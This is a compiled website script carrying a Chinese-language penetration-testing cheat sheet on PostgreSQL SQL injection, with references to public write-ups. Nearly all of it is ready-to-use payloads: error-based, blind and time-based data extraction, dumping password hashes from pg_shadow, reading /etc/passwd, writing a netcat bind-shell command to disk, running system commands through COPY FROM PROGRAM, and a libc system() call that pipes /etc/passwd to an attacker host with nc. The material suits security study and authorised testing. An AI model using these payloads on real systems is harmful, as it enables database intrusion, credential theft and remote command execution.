"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[7890],{4977:(e,s,l)=>{l.r(s),l.d(s,{assets:()=>i,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>n,toc:()=>d});const n=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL","title":"PostgreSQL","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/05.PostgreSQL.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/05.PostgreSQL.md","tags":[],"version":"current","sidebarPosition":5,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"MySQL","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL"},"next":{"title":"SQLite","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/SQLite"}}');var t=l(4848),r=l(8453);const a={},c=void 0,i={},d=[{value:"PostgreSQL \u6ce8\u91ca",id:"postgresql-\u6ce8\u91ca",level:2},{value:"PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7",id:"postgresql-\u94fe\u6ce8\u5165\u70b9\u7b26\u53f7",level:2},{value:"PostgreSQL \u7248\u672c",id:"postgresql-\u7248\u672c",level:2},{value:"PostgreSQL \u5f53\u524d\u7528\u6237",id:"postgresql-\u5f53\u524d\u7528\u6237",level:2},{value:"PostgreSQL \u5217\u8868\u7528\u6237",id:"postgresql-\u5217\u8868\u7528\u6237",level:2},{value:"PostgreSQL \u5217\u8868\u5bc6\u7801\u54c8\u5e0c",id:"postgresql-\u5217\u8868\u5bc6\u7801\u54c8\u5e0c",level:2},{value:"PostgreSQL \u5217\u51fa\u6570\u636e\u5e93\u7ba1\u7406\u5458\u5e10\u6237",id:"postgresql-\u5217\u51fa\u6570\u636e\u5e93\u7ba1\u7406\u5458\u5e10\u6237",level:2},{value:"PostgreSQL \u5217\u8868\u6743\u9650",id:"postgresql-\u5217\u8868\u6743\u9650",level:2},{value:"PostgreSQL \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237",id:"postgresql-\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237",level:2},{value:"PostgreSQL \u6570\u636e\u5e93\u540d\u79f0",id:"postgresql-\u6570\u636e\u5e93\u540d\u79f0",level:2},{value:"PostgreSQL \u5217\u8868\u6570\u636e\u5e93",id:"postgresql-\u5217\u8868\u6570\u636e\u5e93",level:2},{value:"PostgreSQL \u5217\u8868\u8868",id:"postgresql-\u5217\u8868\u8868",level:2},{value:"PostgreSQL \u5217\u8868\u5217",id:"postgresql-\u5217\u8868\u5217",level:2},{value:"PostgreSQL \u57fa\u4e8e\u9519\u8bef",id:"postgresql-\u57fa\u4e8e\u9519\u8bef",level:2},{value:"PostgreSQL \u57fa\u4e8eXML",id:"postgresql-\u57fa\u4e8exml",level:2},{value:"PostgreSQL \u57fa\u4e8e\u76f2\u6ce8",id:"postgresql-\u57fa\u4e8e\u76f2\u6ce8",level:2},{value:"PostgreSQL \u57fa\u4e8e\u65f6\u95f4",id:"postgresql-\u57fa\u4e8e\u65f6\u95f4",level:2},{value:"\u786e\u5b9a\u57fa\u4e8e\u65f6\u95f4\u7684",id:"\u786e\u5b9a\u57fa\u4e8e\u65f6\u95f4\u7684",level:4},{value:"\u57fa\u4e8e\u6570\u636e\u5e93\u8f6c\u50a8\u65f6\u95f4",id:"\u57fa\u4e8e\u6570\u636e\u5e93\u8f6c\u50a8\u65f6\u95f4",level:4},{value:"\u57fa\u4e8e\u8868\u8f6c\u50a8\u65f6\u95f4",id:"\u57fa\u4e8e\u8868\u8f6c\u50a8\u65f6\u95f4",level:4},{value:"\u5217\u8f6c\u50a8\u57fa\u4e8e\u65f6\u95f4",id:"\u5217\u8f6c\u50a8\u57fa\u4e8e\u65f6\u95f4",level:4},{value:"PostgreSQL \u5806\u53e0\u67e5\u8be2",id:"postgresql-\u5806\u53e0\u67e5\u8be2",level:2},{value:"PostgreSQL \u6587\u4ef6\u8bfb\u53d6",id:"postgresql-\u6587\u4ef6\u8bfb\u53d6",level:2},{value:"PostgreSQL \u6587\u4ef6\u5199\u5165",id:"postgresql-\u6587\u4ef6\u5199\u5165",level:2},{value:"PostgreSQL \u547d\u4ee4\u6267\u884c",id:"postgresql-\u547d\u4ee4\u6267\u884c",level:2},{value:"2019 \u5e74 9 \u6708 19 \u65e5",id:"2019-\u5e74-9-\u6708-19-\u65e5",level:3},{value:"\u4f7f\u7528 libc.so.6",id:"\u4f7f\u7528-libcso6",level:3},{value:"\u65c1\u901a\u8fc7\u6ee4\u5668",id:"\u65c1\u901a\u8fc7\u6ee4\u5668",level:3},{value:"\u62a5\u4ef7",id:"\u62a5\u4ef7",level:4},{value:"\u53c2\u8003\u6587\u732e",id:"\u53c2\u8003\u6587\u732e",level:2}];function o(e){const s={a:"a",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(s.table,{children:[(0,t.jsx)(s.thead,{children:(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,t.jsx)(s.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,t.jsx)(s.tbody,{children:(0,t.jsxs)(s.tr,{children:[(0,t.jsx)(s.td,{style:{textAlign:"left"},children:(0,t.jsx)(s.img,{src:"https://img.shields.io/badge/wjlin0-blog-green",alt:"wjlin0"})}),(0,t.jsx)(s.td,{style:{textAlign:"left"},children:"2023-07-05 21:37:29"})]})})]}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u6ce8\u91ca",children:"PostgreSQL \u6ce8\u91ca"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"--\n/**/  \n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u94fe\u6ce8\u5165\u70b9\u7b26\u53f7",children:"PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.\n|| #or statement \n\n# usage examples: \n/?whatever=1;(select 1 from pg_sleep(5))\n/?whatever=1||(select 1 from pg_sleep(5))\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u7248\u672c",children:"PostgreSQL \u7248\u672c"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT version()\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5f53\u524d\u7528\u6237",children:"PostgreSQL \u5f53\u524d\u7528\u6237"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT user;\nSELECT current_user;\nSELECT session_user;\nSELECT usename FROM pg_user;\nSELECT getpgusername();\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u7528\u6237",children:"PostgreSQL \u5217\u8868\u7528\u6237"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT usename FROM pg_user\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u5bc6\u7801\u54c8\u5e0c",children:"PostgreSQL \u5217\u8868\u5bc6\u7801\u54c8\u5e0c"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT usename, passwd FROM pg_shadow \n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u51fa\u6570\u636e\u5e93\u7ba1\u7406\u5458\u5e10\u6237",children:"PostgreSQL \u5217\u51fa\u6570\u636e\u5e93\u7ba1\u7406\u5458\u5e10\u6237"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT usename FROM pg_user WHERE usesuper IS TRUE\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u6743\u9650",children:"PostgreSQL \u5217\u8868\u6743\u9650"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237",children:"PostgreSQL \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SHOW is_superuser; \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u6570\u636e\u5e93\u540d\u79f0",children:"PostgreSQL \u6570\u636e\u5e93\u540d\u79f0"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT current_database()\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u6570\u636e\u5e93",children:"PostgreSQL \u5217\u8868\u6570\u636e\u5e93"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT datname FROM pg_database\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u8868",children:"PostgreSQL \u5217\u8868\u8868"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT table_name FROM information_schema.tables\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5217\u8868\u5217",children:"PostgreSQL \u5217\u8868\u5217"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT column_name FROM information_schema.columns WHERE table_name='data_table'\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u57fa\u4e8e\u9519\u8bef",children:"PostgreSQL \u57fa\u4e8e\u9519\u8bef"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)\n,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)\n\n' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u57fa\u4e8exml",children:"PostgreSQL \u57fa\u4e8eXML"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n"})}),"\n",(0,t.jsxs)(s.p,{children:["\u4e0a\u9762\u7684 ",(0,t.jsx)(s.code,{children:"query_to_xml"})," \u5c06\u6307\u5b9a\u67e5\u8be2\u7684\u6240\u6709\u7ed3\u679c\u4f5c\u4e3a\u5355\u4e2a\u7ed3\u679c\u8fd4\u56de\u3002\u5c06\u5176\u4e0e",(0,t.jsx)(s.a,{href:"#postgresql-error-based",children:"PostgreSQL \u57fa\u4e8e\u9519\u8bef"}),"\u6280\u672f\u76f8\u7ed3\u5408\uff0c\u4ee5\u6392\u9664\u8fc7\u6ee4\u6570\u636e\uff0c\u800c\u4e0d\u5fc5\u62c5\u5fc3 ",(0,t.jsx)(s.code,{children:"LIMIT"})," \u5c06\u67e5\u8be2\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u3002"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select database_to_xml(true,true,''); -- dump the current database to XML\nselect database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n"})}),"\n",(0,t.jsx)(s.p,{children:"\u6ce8\u610f\uff0c\u5bf9\u4e8e\u4e0a\u8ff0\u67e5\u8be2\uff0c\u9700\u8981\u5728\u5185\u5b58\u4e2d\u7ec4\u88c5\u8f93\u51fa\u3002\u5bf9\u4e8e\u8f83\u5927\u7684\u6570\u636e\u5e93\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u901f\u5ea6\u51cf\u6162\u6216\u62d2\u7edd\u670d\u52a1\u7684\u60c5\u51b5\u3002"}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u57fa\u4e8e\u76f2\u6ce8",children:"PostgreSQL \u57fa\u4e8e\u76f2\u6ce8"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u57fa\u4e8e\u65f6\u95f4",children:"PostgreSQL \u57fa\u4e8e\u65f6\u95f4"}),"\n",(0,t.jsx)(s.h4,{id:"\u786e\u5b9a\u57fa\u4e8e\u65f6\u95f4\u7684",children:"\u786e\u5b9a\u57fa\u4e8e\u65f6\u95f4\u7684"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))\n"})}),"\n",(0,t.jsx)(s.h4,{id:"\u57fa\u4e8e\u6570\u636e\u5e93\u8f6c\u50a8\u65f6\u95f4",children:"\u57fa\u4e8e\u6570\u636e\u5e93\u8f6c\u50a8\u65f6\u95f4"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\n"})}),"\n",(0,t.jsx)(s.h4,{id:"\u57fa\u4e8e\u8868\u8f6c\u50a8\u65f6\u95f4",children:"\u57fa\u4e8e\u8868\u8f6c\u50a8\u65f6\u95f4"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n"})}),"\n",(0,t.jsx)(s.h4,{id:"\u5217\u8f6c\u50a8\u57fa\u4e8e\u65f6\u95f4",children:"\u5217\u8f6c\u50a8\u57fa\u4e8e\u65f6\u95f4"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u5806\u53e0\u67e5\u8be2",children:"PostgreSQL \u5806\u53e0\u67e5\u8be2"}),"\n",(0,t.jsx)(s.p,{children:"\u4f7f\u7528\u5206\u53f7\u201c\uff1b\u201d\u6dfb\u52a0\u53e6\u4e00\u4e2a\u67e5\u8be2"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u6587\u4ef6\u8bfb\u53d6",children:"PostgreSQL \u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"select pg_ls_dir('./');\nselect pg_read_file('PG_VERSION', 0, 200);\n"})}),"\n",(0,t.jsxs)(s.p,{children:["\u6ce8\u610f\uff1a\u65e9\u671f\u7248\u672c\u7684 Postgres \u4e0d\u63a5\u53d7 ",(0,t.jsx)(s.code,{children:"pg_read_file"})," \u6216 ",(0,t.jsx)(s.code,{children:"pg_ls_dir"})," \u4e2d\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u8f83\u65b0\u7684\u7248\u672c\uff08\u4ece",(0,t.jsx)(s.a,{href:"https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a",children:"this"}),"\u63d0\u4ea4\u8d77\uff09\u5c06\u5141\u8bb8\u8bfb\u53d6\u8d85\u7ea7\u7528\u6237\u6216 ",(0,t.jsx)(s.code,{children:"default_role_read_server_files"})," \u7ec4\u4e2d\u7684\u7528\u6237\u7684\u4efb\u4f55\u6587\u4ef6/\u6587\u4ef6\u8def\u5f84\u3002"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"CREATE TABLE temp(t TEXT);\nCOPY temp FROM '/etc/passwd';\nSELECT * FROM temp limit 1 offset 0;\n"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\nSELECT lo_get(16420); -- use the OID returned from the above\nSELECT * from pg_largeobject; -- or just get all the large objects and their data\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u6587\u4ef6\u5199\u5165",children:"PostgreSQL \u6587\u4ef6\u5199\u5165"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"CREATE TABLE pentestlab (t TEXT);\nINSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');\nSELECT * FROM pentestlab;\nCOPY pentestlab(t) TO '/tmp/pentestlab';\n"})}),"\n",(0,t.jsx)(s.p,{children:"\u6216\u8005\u4f5c\u4e3a\u4e00\u884c\uff1a"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\nSELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\nSELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n"})}),"\n",(0,t.jsx)(s.h2,{id:"postgresql-\u547d\u4ee4\u6267\u884c",children:"PostgreSQL \u547d\u4ee4\u6267\u884c"}),"\n",(0,t.jsx)(s.h3,{id:"2019-\u5e74-9-\u6708-19-\u65e5",children:"2019 \u5e74 9 \u6708 19 \u65e5"}),"\n",(0,t.jsxs)(s.p,{children:["\u5982\u679c\u60a8\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u5219\u53ef\u4ee5\u4ece",(0,t.jsx)(s.a,{href:"https://github.com/rapid7/metasploit-framework/pull/11598",children:"Metasploit"}),"\u4f7f\u7528\uff0c\u5426\u5219\u60a8\u9700\u8981\u624b\u52a8\u6267\u884c\u4ee5\u4e0b SQL \u67e5\u8be2\u3002"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-SQL",children:"DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists\nCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output\nCOPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function\nSELECT * FROM cmd_exec;                 -- [Optional] View the results\nDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table\n"})}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{src:"https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png",alt:"https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png"})}),"\n",(0,t.jsx)(s.h3,{id:"\u4f7f\u7528-libcso6",children:"\u4f7f\u7528 libc.so.6"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');\n"})}),"\n",(0,t.jsx)(s.h3,{id:"\u65c1\u901a\u8fc7\u6ee4\u5668",children:"\u65c1\u901a\u8fc7\u6ee4\u5668"}),"\n",(0,t.jsx)(s.h4,{id:"\u62a5\u4ef7",children:"\u62a5\u4ef7"}),"\n",(0,t.jsx)(s.p,{children:"\u4f7f\u7528 CHR"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT CHR(65)||CHR(66)||CHR(67);\n"})}),"\n",(0,t.jsx)(s.p,{children:"\u4f7f\u7528\u7f8e\u5143\u7b26\u53f7\uff08>=PostgreSQL \u7248\u672c 8\uff09"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"SELECT $$This is a string$$\nSELECT $TAG$This is another string$TAG$\n"})}),"\n",(0,t.jsx)(s.h2,{id:"\u53c2\u8003\u6587\u732e",children:"\u53c2\u8003\u6587\u732e"}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9",children:"PostgreSQL \u6e17\u900f\u6d4b\u8bd5\u6307\u5357-David Hayter"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5",children:"Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://hackerone.com/reports/181803",children:"SQL \u6ce8\u5165/webApp/oma_conf ctx \u53c2\u6570\uff08viestinta.lahitapiola.fi\uff09-2016 \u5e74 12 \u6708 8 \u65e5-Sergey Bobrov\uff08Bobrov\uff09"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/",children:"POSTGRESQL 9.X \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-2017 \u5e74 10 \u6708 26 \u65e5-Daniel"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://pulsesecurity.co.nz/articles/postgres-sqli",children:"SQL \u6ce8\u5165\u548c Postgres-\u6700\u7ec8 RCE \u7684\u5192\u9669-2020 \u5e74 5 \u6708 5 \u65e5-Denis Andzakovic"})}),"\n",(0,t.jsx)(s.li,{children:(0,t.jsx)(s.a,{href:"https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf",children:"\u9ad8\u7ea7 PostgreSQL SQL \u6ce8\u5165\u548c\u8fc7\u6ee4\u5668\u7ed5\u8fc7\u6280\u672f-2009-INFIGO"})}),"\n"]})]})}function h(e={}){const{wrapper:s}={...(0,r.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},8453:(e,s,l)=>{l.d(s,{R:()=>a,x:()=>c});var n=l(6540);const t={},r=n.createContext(t);function a(e){const s=n.useContext(r);return n.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),n.createElement(r.Provider,{value:s},e.children)}}}]);